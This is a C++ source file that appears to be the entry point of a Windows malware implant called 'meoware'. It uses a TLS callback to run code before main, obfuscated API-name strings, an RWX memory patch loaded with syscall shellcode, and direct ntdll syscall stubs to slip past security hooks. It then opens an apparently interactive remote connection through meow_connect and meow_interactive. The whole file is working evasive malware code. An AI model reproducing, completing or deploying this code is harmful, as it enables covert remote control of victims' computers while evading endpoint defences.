#define _WINSOCKAPI_
#include <Windows.h>

#include <iostream>
#include <cstdlib>
#include <stdio.h>

using namespace std;

#include "strobf.hpp"
#include "APIfuncpointer.h"
#include "resolver.h"
#include "stubber.h"
#include "meoware.h"

void NTAPI TLS_init(PVOID DllHandle, DWORD Reason, PVOID Reserved);

#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:p_tls_array")
#pragma const_seg(".CRT$XLA")
EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_array[] = { TLS_init, 0 };
#pragma const_seg()

void NTAPI TLS_init(PVOID DllHandle, DWORD Reason, PVOID Reserved)
{
    /*
    0:  48 c7 c0 2c 00 00 00    mov    rax,0x2c
    7:  49 c7 c2 ff ff ff ff    mov    r10,0xffffffffffffffff
    e:  48 31 d2                xor    rdx,rdx
    11: 0f 05                   syscall
    */
    constexpr auto str_NtCreateUserProcess = OBFUSCATE("NtCreateUserProcess");
    constexpr auto str_NtQueryPerformanceCounter = OBFUSCATE("NtQueryPerformanceCounter");
    constexpr auto str_NtDeviceIoControlFile = OBFUSCATE("NtDeviceIoControlFile");
    constexpr auto str_NtCreateEvent = OBFUSCATE("NtCreateEvent");
    constexpr auto str_NtWaitForSingleObject = OBFUSCATE("NtWaitForSingleObject");
    constexpr auto str_NtClose = OBFUSCATE("NtClose");

    BYTE NtTerminateProcessShellcode[] = { 0x48, 0xC7, 0xC0, 0x2C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x31, 0xD2, 0x0F, 0x05 };
    DWORD rwx = 0x40;
    void* ntdll;

    VirtualProtect(stubs, 0x1000, rwx, &rwx);

    for (DWORD i = 0; i < sizeof(NtTerminateProcessShellcode); ++i) {
        stubs[ID_ZwTerminateProcess][i] = NtTerminateProcessShellcode[i];
    }

    ntdll = GetImageBase((WCHAR*)L"ntdll.dll");

    DEOBFUSCA(str_NtCreateUserProcess);
    DEOBFUSCA(str_NtQueryPerformanceCounter);
    DEOBFUSCA(str_NtDeviceIoControlFile);
    DEOBFUSCA(str_NtCreateEvent);
    DEOBFUSCA(str_NtWaitForSingleObject);
    DEOBFUSCA(str_NtClose);

    GetAPIStub(ID_NtCreateUserProcess, (BYTE*)ntdll, (CHAR*)&str_NtCreateUserProcess);
    GetAPIStub(ID_NtQueryPerformanceCounter, (BYTE*)ntdll, (CHAR*)&str_NtQueryPerformanceCounter);
    GetAPIStub(ID_NtDeviceIoControlFile, (BYTE*)ntdll, (CHAR*)&str_NtDeviceIoControlFile);
    GetAPIStub(ID_NtCreateEvent, (BYTE*)ntdll, (CHAR*)&str_NtCreateEvent);
    GetAPIStub(ID_NtWaitForSingleObject, (BYTE*)ntdll, (CHAR*)&str_NtWaitForSingleObject);
    GetAPIStub(ID_NtClose, (BYTE*)ntdll, (CHAR*)&str_NtClose);
}

// Ref: https://stackoverflow.com/questions/36543301/detecting-windows-10-version/36545162
#define STATUS_SUCCESS (0x00000000)
typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

RTL_OSVERSIONINFOW GetRealOSVersion() {
    HMODULE hMod = ::GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)::GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr != nullptr) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (STATUS_SUCCESS == fxPtr(&rovi)) {
                return rovi;
            }
        }
    }
    RTL_OSVERSIONINFOW rovi = { 0 };
    return rovi;
}

int main(void)
{
    meow_context* context;

    auto os = GetRealOSVersion();

    if (os.dwMajorVersion != 10) {
        return 0;
    }

    context = meow_init();
    context->meow_connect(context);
    context->meow_interactive(context);
}
